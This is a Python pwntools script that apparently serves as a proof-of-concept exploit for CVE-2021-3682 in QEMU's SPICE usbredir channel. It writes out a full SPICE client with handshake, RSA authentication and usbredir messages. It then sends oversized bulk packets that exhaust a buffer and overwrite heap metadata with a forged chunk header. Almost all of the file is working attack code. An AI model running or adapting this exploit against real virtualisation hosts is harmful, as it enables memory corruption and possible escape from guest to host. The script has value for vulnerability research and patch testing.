from pwn import *
from Crypto.Util.number import bytes_to_long, long_to_bytes
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

class SpiceClient():
    def __init__(self, server_ip, server_port, log=False):
        self.server_ip = server_ip
        self.server_port = server_port
        self.magic = b"REDQ"
        self.major_version = 2
        self.minor_version = 2
        self.channel_types = [
            "SPICE_CHANNEL_UNDEFINED",
            "SPICE_CHANNEL_MAIN",
            "SPICE_CHANNEL_DISPLAY",
            "SPICE_CHANNEL_INPUTS",
            "SPICE_CHANNEL_CURSOR",
            "SPICE_CHANNEL_PLAYBACK",
            "SPICE_CHANNEL_RECORD",
            "SPICE_CHANNEL_TUNNEL",
            "SPICE_CHANNEL_SMARTCARD",
            "SPICE_CHANNEL_USBREDIR",
            "SPICE_CHANNEL_PORT",
            "SPICE_CHANNEL_WEBDAV",
        ]
        self.log = log
        self.main_channel = None
        self.channels = [None] * 10
        self.server_public_rsa_key = None
        self.main_channel_serial = 0
        self.channels_serial = [0] * 10
        self.session_id = 0

        self.start()

    def do_recv(self, channel, length):
        msg = b""
        while len(msg) != length:
            tmp_msg = channel.recv(length)
            msg += tmp_msg
        return msg

    def do_send(self, channel, packet):
        channel.send(packet)

    def start(self):
        self.connect_main_channel()

    def connect_main_channel(self):
        self.main_channel = remote(self.server_ip, self.server_port)

        header = self.magic + p32(self.major_version) + p32(self.minor_version)
        link_mess = p32(0) + p8(1) + p8(0) + \
                    p32(1) + p32(1)
        link_mess_size = len(link_mess) + 12
        caps_offset = len(link_mess) + 4
        caps = p32(1<<0|1<<1) + p32(0)
        packet = header + p32(link_mess_size) + link_mess + p32(caps_offset) + caps

        self.do_send(self.main_channel, packet)
        msg_recv = self.do_recv(self.main_channel, 202)

        if self.log:
            self.log_link_status(msg_recv)

        self.authenticate(self.main_channel)

        for i in range(4):
            self.server_spice_data(self.main_channel)

        self.client_msg_main_attach_channels()
        self.server_spice_data(self.main_channel)

        for i in range(2):
            self.server_spice_data(self.main_channel)

    def connect_channel(self, \
                channel_type=1, \
                channel_id=0, \
                num_common_caps=0, \
                common_caps=[], \
                num_channel_caps=0, \
                channel_caps=[]):
        assert len(common_caps) == num_common_caps, "num_common_caps dismatch"
        assert len(channel_caps) == num_channel_caps, "num_channel_caps dismatch"
            
        self.channels[channel_type] = remote(self.server_ip, self.server_port)

        header = self.magic + p32(self.major_version) + p32(self.minor_version)
        link_mess = p32(self.session_id) + p8(channel_type) + p8(channel_id) + \
                    p32(num_common_caps) + p32(num_channel_caps)
        link_mess_size = len(link_mess) + 4 + num_common_caps * 4 + num_channel_caps * 4 
        caps_offset = len(link_mess) + 4
        packet = header + p32(link_mess_size) + link_mess + p32(caps_offset)
        for i in range(num_common_caps):
            packet += p32(common_caps[i])
        for i in range(num_channel_caps):
            packet += p32(channel_caps[i])

        self.do_send(self.channels[channel_type], packet)
        msg_recv = self.do_recv(self.channels[channel_type], 202)

        if self.log:
            self.log_link_status(msg_recv)

        self.authenticate(self.channels[channel_type])

        self.server_spice_data(self.channels[channel_type])

    def keep_connecting(self):
        pause()

    def authenticate(self, channel):
        packet = p32(1)
        self.do_send(channel, packet)

        plain = b"password"
        key = RSA.importKey(self.server_public_rsa_key)
        cipher = PKCS1_OAEP.new(key)
        ciphertext = cipher.encrypt(plain)

        self.do_send(channel, ciphertext)
        status_code = u32(self.do_recv(channel, 4))

        if self.log:
            print()
            print("================ connection status start ================")
            self.do_log("status code", status_code)
            print("================= connection status end =================")
            print()

    def client_hello_back(self, caps):
        usb_redir_header_type = 0
        usb_redir_header_length = 0x40 + 4 * len(caps)
        usb_redir_header_id = 0

        client_version = b"CVE-2021-3682".ljust(0x40, b"\x00")
        client_caps = b""
        for cap in caps:
            client_caps += p32(cap)

        msg_size = 0xC + usb_redir_header_length

        packet = p64(self.channels_serial[9]) + p16(101) + p32(msg_size) + p32(0)

        packet += p32(usb_redir_header_type) + p32(usb_redir_header_length) + \
                  p32(usb_redir_header_id) + \
                  client_version + client_caps

        self.do_send(self.channels[9], packet)
        self.channels_serial[9] += 1

    def client_usb_redir_interface_info(self):
        usb_redir_header_type = 4
        usb_redir_header_length = 0x84
        usb_redir_header_id = 0

        usb_redir_interface_info_header_interface_count = 0x1
        usb_redir_interface_info_header_interface = [0] * 32
        usb_redir_interface_info_header_interface_class = [0] * 32
        usb_redir_interface_info_header_interface_subclass = [0] * 32
        usb_redir_interface_info_header_interface_protocol = [0] * 32

        msg_size = 0x10 + usb_redir_header_length

        packet = p64(self.channels_serial[9]) + p16(101) + p32(msg_size) + p32(0)

        packet += p32(usb_redir_header_type) + p32(usb_redir_header_length) + \
                  p32(usb_redir_header_id) + p32(0) + \
                  p32(usb_redir_interface_info_header_interface_count)

        for item in usb_redir_interface_info_header_interface:
            packet += p8(item)
        for item in usb_redir_interface_info_header_interface_class:
            packet += p8(item)
        for item in usb_redir_interface_info_header_interface_subclass:
            packet += p8(item)
        for item in usb_redir_interface_info_header_interface_protocol:
            packet += p8(item)

        self.do_send(self.channels[9], packet)
        self.channels_serial[9] += 1


    def client_usb_redir_device_connect(self):
        usb_redir_header_type = 1
        usb_redir_header_length = 10
        usb_redir_header_id = 0

        usb_redir_device_connect_header_speed = 1
        usb_redir_device_connect_header_device_classs = 0
        usb_redir_device_connect_header_device_subclass = 0
        usb_redir_device_connect_header_device_protocol = 0
        usb_redir_device_connect_header_vendor_id = 0x45b
        usb_redir_device_connect_header_product_id = 0x53
        usb_redir_device_connect_header_device_version_bcd = 0

        msg_size = 0x10 + usb_redir_header_length

        packet = p64(self.channels_serial[9]) + p16(101) + p32(msg_size) + p32(0)

        packet += p32(usb_redir_header_type) + p32(usb_redir_header_length) + \
                  p32(usb_redir_header_id) + p32(0) + \
                  p8(usb_redir_device_connect_header_speed) + \
                  p8(usb_redir_device_connect_header_device_classs) + \
                  p8(usb_redir_device_connect_header_device_subclass) + \
                  p8(usb_redir_device_connect_header_device_protocol) + \
                  p16(usb_redir_device_connect_header_vendor_id) + \
                  p16(usb_redir_device_connect_header_product_id) + \
                  p16(usb_redir_device_connect_header_device_version_bcd)

        self.do_send(self.channels[9], packet)
        self.channels_serial[9] += 1

    def client_usb_redir_ep_info(self):
        usb_redir_header_type = 5
        usb_redir_header_length = 0x120
        usb_redir_header_id = 0

        usb_redir_ep_info_header_type = [0] * 32
        usb_redir_ep_info_header_type[0x11] = 2
        usb_redir_ep_info_header_interval = [0] * 32
        usb_redir_ep_info_header_interface = [0] * 32
        usb_redir_ep_info_header_max_packet_size = [0] * 32
        usb_redir_ep_info_header_max_packet_size[0x11] = 0x10
        usb_redir_ep_info_header_max_streams = [0] * 32

        msg_size = 0xC + usb_redir_header_length + 4

        packet = p64(self.channels_serial[9]) + p16(101) + p32(msg_size) + p32(0)

        packet += p32(usb_redir_header_type) + p32(usb_redir_header_length) + \
                 p32(usb_redir_header_id) + p32(0) # why should add padding ?
        for item in usb_redir_ep_info_header_type:
            packet += p8(item)
        for item in usb_redir_ep_info_header_interval:
            packet += p8(item)
        for item in usb_redir_ep_info_header_interface:
            packet += p8(item)
        for item in usb_redir_ep_info_header_max_packet_size:
            packet += p16(item)
        for item in usb_redir_ep_info_header_max_streams:
            packet += p32(item)

        self.do_send(self.channels[9], packet)
        self.channels_serial[9] += 1


    def client_usbredirt_send_buffered_bulk_packet(self, data):
        usb_redir_header_type = 104
        usb_redir_header_length = 10
        usb_redir_header_id = 0
        stream_id = 0
        length = len(data)
        endpoint = 0x81
        status = 0
        usb_redir_header_length = 10 + length
        msg_size = 0xC + usb_redir_header_length + 4

        packet = p64(self.channels_serial[9]) + p16(101) + p32(msg_size) + p32(0)

        packet += p32(usb_redir_header_type) + p32(usb_redir_header_length) + \
                  p32(usb_redir_header_id) + p32(0) + \
                  p32(stream_id) + p32(length) + p8(endpoint) + p8(status) + \
                  data

        self.do_send(self.channels[9], packet)
        self.channels_serial[9] += 1
        

    def server_spice_data(self, channel):
        server_serial = u64(self.do_recv(channel, 8))
        msg_type = u16(self.do_recv(channel, 2))
        msg_size = u32(self.do_recv(channel, 4))
        # sub_list can be non-zero value, to be done
        sub_list = u32(self.do_recv(channel, 4))

        if channel == self.main_channel:
            # SPICE_MSG_MAIN_INIT 
            if msg_type == 103:
                self.server_msg_main_init(channel, server_serial, msg_size)
            # SPICE_MSG_PING
            elif msg_type == 4:
                self.server_msg_ping(channel, server_serial, msg_size)
            # SPICE_MSG_MAIN_CHANNELS_LIST
            elif msg_type == 104:
                self.server_msg_main_channels_list(server_serial, msg_size)
        # at present, only cares about usbredir channel
        else:
            # SPICE_MSG_SPICEVMC_DATA
            if msg_type == 101:
                self.server_msg_spicevmc_data(channel, server_serial, msg_size)

        # to be added

    def server_msg_spicevmc_data(self, channel, server_serial, msg_size):
        usb_redir_header_type = u32(self.do_recv(channel, 4))
        usb_redir_header_length = u32(self.do_recv(channel, 4))
        usb_redir_header_id = u32(self.do_recv(channel, 4))

        # usb_redir_hello
        if usb_redir_header_type == 0:
            version = self.do_recv(channel, 0x40).decode()
            caps = []
            for i in range(0x40, usb_redir_header_length, 4):
                caps.append(u32(self.do_recv(channel, 4)))

            self.client_hello_back(caps)

            if self.log:
                print()
                print("==================== serial %02d start ====================" % server_serial)
                self.do_log("messaget type", "SPICE_MSG_SPICEVMC_DATA (usb_redir_hello)")
                self.do_log("version", version)
                print("[+] common_caps: ", end="")
                for item in caps:
                    print(item, end=" ")
                print()
                print("===================== serial %02d end =====================" % server_serial)
                print() 

        # to be added

    def server_msg_main_init(self, channel, server_serial, msg_size):
        assert msg_size == 0x20, "unexpected message size"
            
        self.session_id = u32(self.do_recv(channel, 4))
        display_channels_hint = u32(self.do_recv(channel, 4))
        supported_mouse_modes = u32(self.do_recv(channel, 4))
        current_mouse_mode = u32(self.do_recv(channel, 4))
        agent_connected = u32(self.do_recv(channel, 4))
        agent_tokens = u32(self.do_recv(channel, 4))
        multi_media_time = u32(self.do_recv(channel, 4))
        ram_hint = u32(self.do_recv(channel, 4))

        if self.log:
            print()
            print("==================== serial %02d start ====================" % server_serial)
            self.do_log("messaget type", "SPICE_MSG_MAIN_INIT")
            self.do_log("session_id", hex(self.session_id))
            self.do_log("display_channels_hint", hex(display_channels_hint))
            self.do_log("supported_mouse_modes", hex(supported_mouse_modes))
            self.do_log("current_mouse_mode", hex(current_mouse_mode))
            self.do_log("agent_connected", hex(agent_connected))
            self.do_log("agent_tokens", hex(agent_tokens))
            self.do_log("multi_media_time", hex(multi_media_time))
            self.do_log("ram_hint", hex(ram_hint))
            print("===================== serial %02d end =====================" % server_serial)
            print()

    def server_msg_ping(self, channel, server_serial, msg_size):
        # assert msg_size == 0xC, "unexpected message size"

        msg_id = u32(self.do_recv(channel, 4))
        msg_time = u64(self.do_recv(channel, 8))

        if msg_size != 0xC:
            self.do_recv(channel, msg_size - 0xC)

        # client reply
        self.client_msg_pong(channel, msg_id, msg_time)

        if self.log:
            print()
            print("==================== serial %02d start ====================" % server_serial)
            self.do_log("messaget type", "SPICE_MSG_PING")
            self.do_log("msg_id", msg_id)
            self.do_log("msg_time", hex(msg_time))
            print("===================== serial %02d end =====================" % server_serial)
            print()

    def server_msg_main_channels_list(self, server_serial, msg_size):
        num_of_channels = u32(self.do_recv(self.main_channel, 4))
        channels = []
        for i in range(num_of_channels):
            channels.append((u8(self.do_recv(self.main_channel, 1)), u8(self.do_recv(self.main_channel, 1))))

        if self.log:
            print()
            print("==================== serial %02d start ====================" % server_serial)
            self.do_log("messaget type", "SPICE_MSG_MAIN_CHANNELS_LIST")
            self.do_log("num_of_channels", num_of_channels)
            for item in channels:
                self.do_log(self.channel_types[item[0]] + " id", item[1])
            print("===================== serial %02d end =====================" % server_serial)
            print()

    def client_msg_pong(self, channel, msg_id, msg_time):
        packet = p64(self.main_channel_serial) + p16(3) + p32(0xC) + p32(0)
        packet += p32(msg_id) + p64(msg_time)
        self.do_send(channel, packet)
        self.main_channel_serial += 1

    def client_msg_main_attach_channels(self):
        packet = p64(self.main_channel_serial) + p16(104) + p32(0x0) + p32(0)
        self.do_send(self.main_channel, packet)
        self.main_channel_serial += 1

    def do_log(self, msg_name, msg_value):
         print("[+] %s: %s" % (msg_name, msg_value))

    def log_link_status(self, msg_recv):
        print()
        print("===================== link_status start =====================")
        idx = 0
        magic = msg_recv[idx:idx+4].decode()
        idx += 4
        major_version = u32(msg_recv[idx:idx+4])
        idx += 4
        minor_version = u32(msg_recv[idx:idx+4])
        idx += 4
        link_mess_len = u32(msg_recv[idx:idx+4])
        idx += 4
        error_code = u32(msg_recv[idx:idx+4])
        idx += 4
        self.server_public_rsa_key = msg_recv[idx:idx+128+34]
        idx += 128+34
        num_common_caps = u32(msg_recv[idx:idx+4])
        idx += 4
        num_channel_caps = u32(msg_recv[idx:idx+4])
        idx += 4
        caps_offset = u32(msg_recv[idx:idx+4])
        idx = caps_offset + 4 * 4

        self.do_log("msg length", len(msg_recv))
        self.do_log("magic", magic)
        self.do_log("major_version", major_version)
        self.do_log("minor_version", minor_version)
        self.do_log("error code", hex(error_code))
        self.do_log("public_rsa_key", self.server_public_rsa_key)
        self.do_log("num_common_caps", num_common_caps)
        self.do_log("num_channel_caps", num_channel_caps)

        print("[+] common_caps: ", end="")
        for i in range(num_common_caps):
            print(u32(msg_recv[idx:idx+4]),end="")
            idx += 4
        print()
        print("[+] channel_caps: ", end="")
        for i in range(num_channel_caps):
            print(u32(msg_recv[idx:idx+4]),end="")
            idx += 4
        print()
        print("====================== link_status end ======================")
        print()

client = SpiceClient("127.0.0.1", 9999, True)
client.connect_channel(channel_type=9, num_common_caps=1, common_caps=[1<<0|1<<1], num_channel_caps=1, channel_caps=[0xf])
client.client_usb_redir_interface_info()
client.client_usb_redir_device_connect()
client.client_usb_redir_ep_info()
client.keep_connecting()

# should control usb to start_bulk_receiving first
payload = b'A' * 0x1fff0  # consume the usb dma buffer
client.client_usbredirt_send_buffered_bulk_packet(payload)
payload = b'B' * (10000 * 0x10 - 0x320 - 0x180)# almost reach the limit
client.client_usbredirt_send_buffered_bulk_packet(payload)
client.keep_connecting()

payload = b'B' * 0x180
client.client_usbredirt_send_buffered_bulk_packet(payload)
client.keep_connecting()

payload = b'C' * 0x320 +  p64(0x0) + p64(0x191) + b'A' * 0x158
client.client_usbredirt_send_buffered_bulk_packet(payload)
client.keep_connecting()
